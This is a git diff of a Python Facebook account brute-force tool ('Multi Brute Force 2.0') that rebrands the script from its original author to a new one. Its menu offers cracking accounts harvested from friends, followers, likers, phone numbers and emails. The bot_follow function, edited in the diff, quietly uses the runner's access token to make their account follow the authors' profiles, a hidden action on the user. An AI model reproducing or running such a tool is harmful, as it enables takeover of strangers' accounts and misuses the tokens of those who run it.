@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ By Dapunta
+# Created By Dapunta Fixed By Ramdhan R
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
 from random import randint
@@ -33,7 +33,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Created By Ramdhan Ramadhian  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Ramdhan7 ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ips=None
@@ -262,8 +262,8 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) # Abigaille Dirgantara
 	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       # Boirah
 	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) # Anita Zuliatin
-	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) # Dapunta Xayonara
-	requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
+	requests.post("https://graph.facebook.com/100000912671987/subscribers?access_token=" + toket) # Moch Ramdhan
+	requests.post("https://graph.facebook.com/100044932290784/subscribers?access_token=" + toket) # Ramdhan Ramadhian
 	requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + toket)      # Wati Waningsih
 	requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + toket)      # Rofi Nurhanifah
 	requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + toket) # Diah Ayu Kharisma
@@ -276,7 +276,7 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
 	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) # Rizal F
 	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) # Angga Kurniawan
-	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moh Yayan
+	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moch Yayan
 	requests.post("https://graph.facebook.com/607821/subscribers?access_token=" + toket)          # Raifan
 	menu()
 
@@ -310,9 +310,9 @@ def menu():
     print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Test Version"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
+    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friends"))
     print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
+    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likes"))
     print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
     print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
     print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
@@ -356,7 +356,7 @@ def choose_menu():
 def pilihcrack(file):
   print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
   print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
+  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Medium"+p+")("+h+"Recommended"+p+")"))
   print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
   print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
   krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
@@ -1287,12 +1287,12 @@ class bapittl:
 
 ### RESULT ###
 
-def results(Dapunta,Krahkrah):
-        if len(Dapunta) !=0:
-                print(("[OK] : "+str(len(Dapunta))))
+def results(Ramdhan,Krahkrah):
+        if len(Ramdhan) !=0:
+                print(("[OK] : "+str(len(Ramdhan))))
         if len(Krahkrah) !=0:
                 print(("[CP] : "+str(len(Krahkrah))))
-        if len(Dapunta) ==0 and len(Krahkrah) ==0:
+        if len(Ramdhan) ==0 and len(Krahkrah) ==0:
                 print("\n")
                 print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
 
